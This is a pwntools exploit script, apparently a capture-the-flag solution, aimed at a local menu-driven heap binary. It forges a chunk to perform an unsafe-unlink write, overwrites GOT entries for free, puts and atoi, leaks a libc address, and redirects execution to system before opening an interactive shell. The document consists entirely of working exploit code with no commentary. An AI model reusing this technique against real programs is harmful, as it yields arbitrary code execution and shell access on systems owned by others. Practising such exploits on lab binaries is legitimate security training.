from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample0')
elf = ELF('./data/sample0')
libc = elf.libc
g_pointer = 0x602140

def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recv()

alloc(0x100);alloc(0x30);alloc(0x80)#step.1
payload = p64(0)+ p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90);edit(2, len(payload), payload)#step.2
free(3)#step.3
payload2 =  b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi']);edit(2,len(payload2),payload2)#step.4
payload3 = p64(elf.plt['puts']);edit(0,len(payload3),payload3)#step.5
ret = '0x' + free(1)[:6][::-1].hex()#step.6
puts_addr = int(ret, 16);libc_addr = puts_addr - libc.sym['puts'] ;system_addr = libc_addr + libc.sym['system'];payload4 = p64(system_addr);edit(2,len(payload4),payload4)#step.7
p.interactive()